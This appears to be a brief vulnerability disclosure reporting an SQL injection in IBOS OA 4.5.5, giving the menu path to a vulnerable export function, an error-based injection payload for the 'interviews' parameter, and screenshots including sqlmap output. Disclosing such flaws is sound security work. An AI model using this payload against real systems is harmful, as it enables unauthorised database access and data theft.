SQL injection vulnerability in ibos oa v4.5.5

official website： http://www.ibos.com.cn/

version：4.5.5

Log in to the background. General Office => Recruitment Management => Interview Management => More Operations => Export Capture and Error Injection Succeeded
![image](https://github.com/xiaosed/cve/assets/84080097/48620232-c209-43b5-87e8-4334b2c7ff38)
![image](https://github.com/xiaosed/cve/assets/84080097/1103e24d-e97d-495b-be21-825e0d19c763)
![image](https://github.com/xiaosed/cve/assets/84080097/640e7fba-833a-4eed-8a2d-d7fcd2264071)

payload:interviews=1'and/**/extractvalue(1,concat(char(126),md5(1703919257)))and'
sqlmap：
![image](https://github.com/xiaosed/cve/assets/84080097/aabdd8ae-2063-42ae-afb4-5c6024e04865)



